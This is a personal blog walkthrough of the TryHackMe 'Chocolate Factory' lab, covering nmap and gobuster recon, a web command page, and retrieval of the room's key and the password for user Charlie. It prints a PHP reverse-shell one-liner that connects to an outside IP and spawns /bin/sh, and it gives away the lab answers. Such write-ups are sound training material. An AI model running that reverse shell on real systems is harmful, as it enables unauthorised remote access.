---
title: "I did the TryHackMe Chocolate Factory Lab, so here is a walkthrough"
date: 2025-8-23
image: https://dvanmosselbeen.github.io/TryHackMe_writeups/chocolatefactory/files/golden-ticket.jpg
layout: post
---

I decided to go through the TryHackMe Chocolate Factory room. Here is a walkthrough of what I did.

### Part 1: Getting the key

Question one is to find the answer key as shown below.

![An image of question one on the TryHackMe Website reading: "Enter the answer key you found!"](https://files.catbox.moe/gx15cn.png)

I will start by connecting to the VPN Server with OpenVPN.

This is a screen recording of me doing exactly that

<video controls width="100%">
  <source src="https://files.catbox.moe/lfln6b.mp4" type="video/mp4">
  Your browser does not support the video tag.
</video>

As you can see it is quite easy to do so even if the AttackBox seems tempting.

I will now start with a simple Nmap scan

![The terminal output of said Nmap scan](https://files.catbox.moe/kcadh3.png)

While nothing interesting, the http port does seem interesting, so let's check it out.

I will need to go to http://10.10.30.125 as that is my given target IP.

![A screenshot of the resulting page](https://files.catbox.moe/z1p7u9.png)

I can't really do anything with this. I tried a few basic credentials like 'Admin' 'Admin' and even tried SQL Injections but nothing. 
Looking at the terminal output I see an FTP service. I will try using the Nmap Banner command command and see the result.

I will now run the following command: nmap --script=banner 10.10.30.125 -p21-125 -v

![here is the output btw :)](https://files.catbox.moe/r7m69l.png)

Well that was a waste of time. All I got is a welcome message :/

Remember the original scan I did. Well I tried every port listed and got an interesting result from port 113 when doing a Netcat scan.

![Idk what to put here 😭](https://files.catbox.moe/l0v4ls.png)

This is great progress from before.

I will go to the following address as in: http://10.10.30.125/key_rev_key

Let's see what happens!

![A prompt for a download from said address :)](https://files.catbox.moe/pwnco2.png)

Well what happens if I extract the file.

![I scrolled down after running: strings key_rev_key](https://files.catbox.moe/34oz92.png)

And there is the answer. Submitting it shows it is correct.

### Charlie's Password

Well if you thought that was it well, you'd be WRONG, that was just the start lol.

I think this might be easier as this is just asking for a password.

![The question btw](https://litter.catbox.moe/1ds4r26y3wr2yeit.png)

Okay, I know there is a http service, could there be any more directories on the server.
I will use Go boster to find out exactly that

gobuster dir -u http://10.10.8.21/ -w /usr/share/dirb/wordlists/common.txt -x php,html,js,txt

And this was the result 

![yes i did steal this image](https://cryptichacker.github.io/assets/img/tryhackme/chocolatefactory/3.png)

Yes, yes I did just steal this image from another write-up 😭

![whyyyyyyy](https://cdn.discordapp.com/attachments/1084461361393836162/1408023721733521499/image0.gif?ex=68ac3047&is=68aadec7&hm=8599790a97e30b9721ac498766c3301dfedd4a11c6f0f7e033b327b8b0fdbf3a&)

I will go to home.php as shown in the (stolen) screenshot I showed.

![idk figure it out](https://litter.catbox.moe/ulorcm72yz628eyo.png)

Ohhhhhhhh this is great progress. A literal command prompt, what more could I possibly ask.

I will try running: whoami

![well idk what this is](https://litter.catbox.moe/fh6ugf4y7plv2b9f.png)

Ok am puzzled at this. I was expecting the username to be something like Charlie. Maybe this is a seperate user environment.

Wait what is this a php payload: php -r '$sock=fsockopen("18.202.129.195",4444);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'

Let's run it!

![It is loading smth?](https://litter.catbox.moe/tinuabqig3o9lpl9.png)

Something is loading?

Let's check netcat now

update: I am using a macOS machine so unfortunatly I can't show you my results. I will link the images from another write-up and I will have a link below. If you find a solution feel free to send me a message on Discord, @noah_deyck or email me at brevity.slicer9f@icloud.com

Let's also run Netcat to scan the payload response. 

![Source: CrypticHacker](https://cryptichacker.github.io/assets/img/tryhackme/chocolatefactory/5.png)

and using the shell i found validate.php. Let's open it

![Source: CrypticHacker](https://cryptichacker.github.io/assets/img/tryhackme/chocolatefactory/8.png)

And there is the password, cn7824.

### To be continued










